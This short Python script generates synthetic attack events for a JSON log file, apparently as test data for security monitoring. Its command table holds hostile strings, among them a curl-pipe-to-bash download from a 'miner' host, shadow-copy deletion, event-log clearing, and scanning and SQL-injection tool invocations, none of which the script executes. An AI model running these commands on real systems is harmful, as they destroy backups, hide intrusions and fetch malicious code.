from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone

ATTACKERS = ["botnet_scanner", "ransomware_operator", "crypto_miner", "apt_actor"]
COMMANDS = {
    "botnet_scanner": ["masscan 10.0.0.0/8 -p22 --rate 10000", "nmap -sV 10.10.0.0/24"],
    "ransomware_operator": ["vssadmin delete shadows /all", "wevtutil cl System"],
    "crypto_miner": ["curl -s http://miner/payload.sh | bash", "wget http://miner/runner"],
    "apt_actor": ["proxychains nmap -sT target", "sqlmap -u http://app?id=1"],
}


def generate_events(count: int = 200):
    now = datetime.now(timezone.utc)
    events = []
    for i in range(count):
        attacker = random.choice(ATTACKERS)
        command = random.choice(COMMANDS[attacker])
        events.append(
            {
                "event_id": f"evt-{i:04d}",
                "attacker_type": attacker,
                "command": command,
                "timestamp": (now - timedelta(seconds=3 * (count - i))).isoformat(),
                "source_ip": f"203.0.113.{random.randint(1, 254)}",
            }
        )
    return events


if __name__ == "__main__":
    data = generate_events()
    with open("synthetic_attack_events.json", "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
